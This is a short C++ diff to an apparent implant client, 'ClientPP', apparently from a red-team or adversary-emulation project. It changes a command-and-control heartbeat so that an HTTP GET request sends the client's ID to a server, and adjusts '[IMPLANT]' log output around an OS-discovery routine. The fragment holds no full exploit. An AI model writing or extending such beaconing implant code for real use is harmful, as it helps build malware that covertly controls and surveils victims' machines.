@@ -102,13 +102,13 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
     return completed_discovery;
 }
 
-void ClientPP::runClient(int dwRandomTimeSleep, void * dylib) {
+void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
     // heartbeat - send HTTP GET request to server
-    std::string heartbeat = "I will eventually contain the heartbeat";
+    std::string heartbeat = c->strClientID;
     std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
     std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector);
 
-    std::cout << "[IMPLANT] Response buffer contains: ";
+    std::cout << "[IMPLANT] Response buffer contains: \n";
     for (auto i: response_vector) {
         std::cout << i;
     }
